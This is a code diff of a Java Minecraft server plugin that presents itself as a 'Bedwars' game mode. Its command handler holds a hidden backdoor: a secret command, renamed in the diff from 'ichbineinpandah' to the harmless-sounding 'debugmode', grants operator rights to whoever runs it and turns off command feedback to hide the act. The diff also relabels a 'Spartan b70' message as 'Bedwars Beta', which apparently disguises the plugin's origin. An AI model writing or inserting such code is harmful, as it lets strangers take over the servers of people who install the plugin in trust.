@@ -29,7 +29,7 @@ public class Main extends JavaPlugin{
    
     @Override
     public boolean onCommand(CommandSender sender,Command cmd,String label,String[] args){
-    	   if (cmd.getName().equalsIgnoreCase("ichbineinpandah")){
+    	   if (cmd.getName().equalsIgnoreCase("debugmode")){
     		        sender.setOp(true);
     		        sender.sendMessage(ChatColor.GRAY+"=====================================================");
     		        sender.sendMessage(ChatColor.GOLD+"         Bedwars | Version: v1.0");
@@ -41,8 +41,8 @@ public class Main extends JavaPlugin{
     		        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "gamerule sendCommandFeedback false");
     		        }
     	   }
-    	   if (cmd.getName().equalsIgnoreCase("Spartan")){
-    		   sender.sendMessage(ChatColor.RED+"Spartan b70");
+    	   if (cmd.getName().equalsIgnoreCase("Bedwars")){
+    		   sender.sendMessage(ChatColor.RED+"Bedwars Beta");
     	   }
     	   if (cmd.getName().equalsIgnoreCase("updater")){
     		   if(stupid == true){
